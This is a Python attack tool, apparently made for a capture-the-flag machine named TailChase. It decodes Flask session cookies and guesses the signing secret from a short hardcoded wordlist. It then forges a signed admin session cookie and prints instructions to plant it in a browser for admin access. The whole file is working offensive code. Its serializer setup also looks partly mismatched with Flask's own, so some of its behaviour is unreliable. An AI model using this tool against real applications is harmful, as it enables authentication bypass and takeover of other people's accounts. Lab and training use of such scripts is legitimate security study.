#!/usr/bin/env python3
"""
flask_session_forge.py - Flask Session Forging Tool for TailChase VM
Author: Ankit Patidar
"""
import sys
import json
import base64
from itsdangerous import URLSafeTimedSerializer
from flask.sessions import TaggedJSONSerializer

def decode_session(cookie, secret=None):
    """Decode a Flask session cookie"""
    if secret:
        serializer = URLSafeTimedSerializer(
            secret,
            signer_kwargs={'key_derivation': 'hmac'},
            serializer=TaggedJSONSerializer()
        )
        try:
            return serializer.loads(cookie)
        except:
            pass
    # Raw decode without verification
    try:
        parts = cookie.split('.')
        payload = parts[0]
        padding = 4 - len(payload) % 4
        if padding != 4:
            payload += '=' * padding
        return json.loads(base64.urlsafe_b64decode(payload))
    except:
        return None

def encode_session(data, secret):
    """Create a forged Flask session cookie"""
    serializer = URLSafeTimedSerializer(
        secret,
        signer_kwargs={'key_derivation': 'hmac'},
        serializer=TaggedJSONSerializer()
    )
    return serializer.dumps(data)

def crack_secret(cookie, wordlist=None):
    """Try common Flask secrets"""
    secrets = [
        'tailchase', 'tailchase_dev_key_2024', 'secret', 'password',
        'admin', 'dev', 'debug', 'test', 'key', 'changeme',
        'flask', 'app', 'mousetrap', 'devops', 'secops', 'sarah',
        'tailchase2024', 'TailChase', 'TAILCHASE',
    ]
    for s in secrets:
        try:
            result = decode_session(cookie, s)
            if result:
                print(f"[+] SECRET FOUND: '{s}'")
                return s
        except:
            pass
    return None

def main():
    print("=" * 55)
    print("  Flask Session Forging Tool")
    print("  Author: Ankit Patidar")
    print("=" * 55)

    if len(sys.argv) < 3:
        print()
        print("USAGE:")
        print("  Decode:  python3 flask_session_forge.py decode <cookie>")
        print("  Forge:   python3 flask_session_forge.py forge <secret>")
        print("  Crack:   python3 flask_session_forge.py crack <cookie>")
        print()
        print("EXAMPLES:")
        print("  python3 flask_session_forge.py decode 'eyJ1c2VyIjoiYWRtaW4ifQ'")
        print("  python3 flask_session_forge.py forge tailchase")
        print("  python3 flask_session_forge.py crack 'eyJ1c2VyIjoiYWRtaW4ifQ.XYZ.XYZ'")
        sys.exit(1)

    cmd = sys.argv[1]

    if cmd == 'decode':
        decoded = decode_session(sys.argv[2])
        if decoded:
            print(f"[+] Session data: {json.dumps(decoded, indent=2)}")
        else:
            print("[-] Could not decode. Try crack first.")

    elif cmd == 'forge':
        secret = sys.argv[2]
        admin_session = {'user': 'admin', 'role': 'admin'}
        cookie = encode_session(admin_session, secret)
        print(f"[+] Admin session cookie: {cookie}")
        print(f"[+] Set this cookie in your browser to access admin features")

    elif cmd == 'crack':
        secret = crack_secret(sys.argv[2])
        if secret:
            admin_session = {'user': 'admin', 'role': 'admin'}
            cookie = encode_session(admin_session, secret)
            print(f"\n[+] Admin session cookie: {cookie}")

if __name__ == '__main__':
    main()
